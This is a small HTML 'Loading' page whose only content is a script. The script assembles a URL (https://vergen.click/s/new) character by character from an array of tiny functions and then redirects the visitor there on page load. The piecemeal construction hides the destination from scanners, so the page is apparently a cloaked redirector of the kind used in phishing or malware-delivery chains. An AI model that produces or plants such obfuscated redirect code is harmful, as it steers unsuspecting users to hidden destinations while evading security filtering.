<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            () => 't',
            () => 't',
            _ => 'p',
            function() { return 's'; },
            _ => ':',
            () => '/',
            function() { return '/'; },
            () => 'v',
            function() { return 'e'; },
            _ => 'r',
            function() { return 'g'; },
            function() { return 'e'; },
            () => 'n',
            () => '.',
            () => 'c',
            function() { return 'l'; },
            _ => 'i',
            function() { return 'c'; },
            function() { return 'k'; },
            () => '/',
            function() { return 's'; },
            function() { return '/'; },
            () => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
